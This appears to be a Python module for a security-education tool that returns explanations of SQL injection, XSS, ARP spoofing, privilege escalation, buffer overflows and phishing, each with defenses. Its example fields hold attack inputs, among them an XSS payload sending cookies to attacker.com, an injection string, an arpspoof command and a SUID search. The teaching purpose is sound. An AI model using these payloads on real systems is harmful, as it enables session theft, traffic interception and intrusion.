"""Explain security concepts — returns structured info for the LLM to present."""

from pentrex.tools.registry import register

CONCEPTS = {
    "sql_injection": {
        "title": "SQL Injection",
        "category": "Web Attacks",
        "description": "Code injection technique that exploits unsanitized user input in SQL queries.",
        "how_it_works": "Attacker inserts malicious SQL through input fields. If the app concatenates user input into queries without sanitization, the injected SQL executes on the database.",
        "example": "Input: ' OR 1=1 -- \nQuery becomes: SELECT * FROM users WHERE name='' OR 1=1 --'",
        "tools": ["SQLmap", "Burp Suite", "Havij"],
        "defenses": ["Parameterized queries", "Input validation", "WAF", "Least privilege DB accounts"],
    },
    "xss": {
        "title": "Cross-Site Scripting (XSS)",
        "category": "Web Attacks",
        "description": "Injecting malicious scripts into web pages viewed by other users.",
        "how_it_works": "Three types: Reflected (URL parameters), Stored (saved on server), DOM-based (client-side). Payload executes in victim's browser context.",
        "example": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "tools": ["Burp Suite", "XSSer", "BeEF"],
        "defenses": ["Output encoding", "Content-Security-Policy header", "HttpOnly cookies", "Input sanitization"],
    },
    "arp_spoofing": {
        "title": "ARP Spoofing",
        "category": "Network Attacks",
        "description": "Sending falsified ARP messages to link attacker's MAC with a legitimate IP on the LAN.",
        "how_it_works": "ARP has no authentication. Attacker sends gratuitous ARP replies associating their MAC with the gateway IP, intercepting traffic meant for the gateway.",
        "example": "arpspoof -i eth0 -t 192.168.1.5 192.168.1.1",
        "tools": ["Ettercap", "arpspoof", "Bettercap"],
        "defenses": ["Static ARP entries", "Dynamic ARP Inspection (DAI)", "802.1X", "VPN"],
    },
    "privilege_escalation": {
        "title": "Privilege Escalation",
        "category": "System Hacking",
        "description": "Gaining higher access levels than originally granted on a compromised system.",
        "how_it_works": "Vertical: user to root/admin. Horizontal: accessing another user's resources. Exploits misconfigurations, vulnerable SUID binaries, kernel exploits, or weak permissions.",
        "example": "find / -perm -4000 2>/dev/null  # Find SUID binaries",
        "tools": ["LinPEAS", "WinPEAS", "GTFOBins", "PowerUp"],
        "defenses": ["Principle of least privilege", "Regular patching", "Audit SUID/SGID", "SELinux/AppArmor"],
    },
    "buffer_overflow": {
        "title": "Buffer Overflow",
        "category": "System Hacking",
        "description": "Writing data beyond allocated memory buffer, potentially overwriting return addresses to execute arbitrary code.",
        "how_it_works": "When a program doesn't check input length, excess data overwrites adjacent memory. Attacker crafts input to overwrite EIP/RIP with address of their shellcode.",
        "example": "python -c \"print('A'*1024 + '\\xef\\xbe\\xad\\xde')\" | ./vulnerable_app",
        "tools": ["GDB", "Immunity Debugger", "Mona.py", "ROPgadget"],
        "defenses": ["ASLR", "DEP/NX bit", "Stack canaries", "Safe functions (strncpy vs strcpy)"],
    },
    "phishing": {
        "title": "Phishing",
        "category": "Social Engineering",
        "description": "Deceptive communication designed to trick users into revealing sensitive information or installing malware.",
        "how_it_works": "Attacker crafts convincing emails/sites mimicking trusted entities. Variants: spear phishing (targeted), whaling (executives), vishing (voice), smishing (SMS).",
        "example": "Fake login page at paypa1.com (1 instead of l) harvesting credentials.",
        "tools": ["GoPhish", "SET (Social Engineering Toolkit)", "King Phisher"],
        "defenses": ["Security awareness training", "Email filtering", "DMARC/SPF/DKIM", "MFA"],
    },
}


@register(
    name="explain",
    description="Explain a cybersecurity concept. Topics: sql_injection, xss, arp_spoofing, privilege_escalation, buffer_overflow, phishing. Or provide any security topic.",
    parameters={
        "topic": {
            "type": "string",
            "description": "Security concept to explain"
        },
    },
)
def explain(topic: str) -> dict:
    # Normalize input
    key = topic.lower().replace(" ", "_").replace("-", "_")

    if key in CONCEPTS:
        return CONCEPTS[key]

    # Fuzzy match
    for k, v in CONCEPTS.items():
        if key in k or k in key or key in v["title"].lower():
            return v

    return {
        "available_topics": list(CONCEPTS.keys()),
        "message": f"No built-in explanation for '{topic}'. Ask me directly and I'll explain it.",
    }
